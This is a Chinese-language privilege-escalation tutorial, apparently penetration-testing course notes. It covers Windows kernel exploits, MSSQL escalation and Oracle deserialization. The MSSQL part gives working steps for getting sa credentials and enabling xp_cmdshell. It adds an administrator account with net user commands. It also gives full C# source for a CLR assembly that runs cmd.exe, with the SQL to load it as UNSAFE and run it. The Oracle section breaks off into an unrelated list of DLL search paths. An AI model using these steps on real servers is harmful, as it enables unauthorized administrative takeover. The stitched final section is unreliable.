本地内核漏洞提权




3.1 系统内核简单流程

系统内核提权就是利用相关的系统漏洞来提升相关权限。


系统漏洞提权流程

获得目标机shell→查看目标机系统版本及补丁→寻找对应的EXP→使用对应的EXP进行提权。

exp.exe传输（通过webshell管理平台、通过命令写文件等）到目标机中，注意可写路径，如：c:/windows/temp。


常见的EXP的执行和使用方式

第一种：执行exp.exe就可以在当前终端

第二种：执行exp.exe能够直接添加管理员账号；

第三种：执行exp.exe 命令

第四种:登录到目标系统中(低权限),执行完exp后会弹出一个新的窗口,该窗口为system权限.连接webshell后查看当前用户的权限找到一个可以上传的目录，将提权EXP上传执行Exp，发现提权成功(第四种：需要登录)

系统漏洞提权一般就是利用系统自身缺陷，用来提升权限。

数据库提权—MSSQL




4.1利用条件

1)必须获得sa的账号密码或者与sa相同给权限的账号密码，且mssql没有被降权；

2)必须可以以某种方式执行sql语句，例如：webshell或者1433端口连接。


4.2获取sa的账号密的方法

1)Webshell或源码获取

   一般在网站的配置文件中有存明文账号密码 ，常用的配置文件名如: conn.aspx、config.aspx、 config.php等

    一般格式如:

    server = localhost；UID= sa；PWD=ichunqiu；database=ichunqiu

2)源代码泄露

    网站源码泄露情况主要以程序员上传代码到git等开源平台或更新代码时末删除备份文件，以及运维人员打包源代码到网站服务器

3) 嗅探

    在局域网中使用Cain等工具进行arp嗅探的时候可以抓取到1433端口的数据库明文登录密码

4)口令暴力破解

    利用mssql暴力破解工具对mssq|进行破解，成功后会获得sa相应的权限

4.3xp_cmdshell提权概述

1) 存储过程

    是存储在 SQLServer中预先定义好的"SQL语句集合",用来实现一些复杂操作

    简单的说使用T-SQL语言编写好的各种小脚本共同组成的集合体,我们称之为”存储过程",类似于udf

2) xp_cmdshell脚本

    扩展存储过程的脚本,是危险性最高的小脚本”,可以执行操作系统的任何指令

3) 注意

    xp_cmdshell默认在mssql2000中是开启的,在 mssql2005之后的版本中则默认禁止

    如果用户拥有管理员sa权限则可以用 sp_configure重新开启它


4.4提权过程（ 2005及以后版本）

    如果在蚁剑中的数据库管理工具中，不需要加前面的exec，如果是自带的或者navicat等工具就需要加上exec。

1)开启xp_cmdshell (xp_cmdshell默认关闭)

exec sp_configure 'show advanced options', 1; //允许修改高级参数reconfigure;exec sp_configure 'xp_cmdshell',1;    //打开xp _cmdshell扩展reconfigure;

    如果存储扩展被禁止使用，并且对应的dll文件被删除！！！上传xplog70.dll，然后回去xp_cmdshell

EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll' declare @o int;sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll';

2)xp_cmdshell执行命令 

exec master..xp_cmdshell 'net user test 123.com /add'  添加用户test ，密码123.comexec master..xp_cmdshell 'net localgroup administrators test /add’  添加test到管理员组

  • 连接数据库: select name from master.dbo.sysdatabases   获取所有的数据库名

4.8MSSQL CLR执行添加外置程序集提权

    Common Language Runtime（CLR）程序集定，义为可以导入SQL Server的.NET DLL（或DLL组）。导入后，DLL方法可以链接到存储过程并通过TSQL执行。创建和导入自定义CLR程序集的能力是开发人员扩展SQL Server本机功能的好方法，但自然也为攻击者创造了机会。以C#代码为例，将下面代码用CSC编译为dIl。

    第一步 先将下面代码发送到

using System;using System.Data;using System.Data.SqlClient;using System.Data.SqlTypes;using Microsoft.SqlServer.Server;using System.IO;using System.Diagnostics;using System.Text;   public partial class StoredProcedures   {       [Microsoft.SqlServer.Server.SqlProcedure]       public static void cmd_exec (SqlString execCommand)       {           Process proc = new Process();           proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";           proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);           proc.StartInfo.UseShellExecute = false;           proc.StartInfo.RedirectStandardOutput = true;           proc.Start();           // Create the record and specify the metadata for the columns.           SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));           // Mark the beginning of the result set.           SqlContext.Pipe.SendResultsStart(record);           // Set values for each column in the row           record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());           // Send the row back to the client.           SqlContext.Pipe.SendResultsRow(record);           // Mark the end of the result set.           SqlContext.Pipe.SendResultsEnd();           proc.WaitForExit();           proc.Close();        }    };

    将如上代码复制到一个文本命名为.cs格式文件。例如cmd_exec.cs

    第二步 本地机器编译

C:\Windows\Microsoft.NET\Framework\v3.5>csc.exe   C:\Users\cream\Desktop\cmd_exec.cs

    找到.net编译器，打开cmd，输入如上命令，其中横线部分为上面保存的cs文件地址，会在当前地址下生成一个dll编译后的文件。

    第三步 将dll文件上传到目标机上

    第四步 开启CLR功能模块 

sp_configure 'show advanced options',1  RECONFIGURE  GO  sp_configure 'clr enabled',1  RECONFIGURE  GO

    第五步 使用某个数据库，添加程序集，首先更改权限将DBowner修改为 sa

alter database test set TRUSTWORTHY onEXEC sp_changedbowner 'sa'

    第六步 添加程序集

CREATE ASSEMBLY my_assembly FROM 'C:\Windows\Temp\cmd_exec.dll' WITH PERMISSION_SET = UNSAFE;GoCREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];GO

    第七步 执行命令即可提升权限

cmd_exec "whoami"

Oracle数据库提权（反序列化提权）




    Oracle数据库容易受到通过java反序列化向量绕过Oracle JVM内置的安全机制来提升用户权限的影响。

    攻击者适当的利用它还可以获取服务 器上的shell级访问权限和对数据库的访问的SYS级别权限。

5.1XML反序列化

  • 程序所在目录。

  • 系统目录即SYSTEM32 目录。

  • 位系统目录即SYSTEM目录。

  • Windows 目录。

  • 加载DLL时所在的当前目录

  • PATH 环境变量中列出的目录 echo %path%
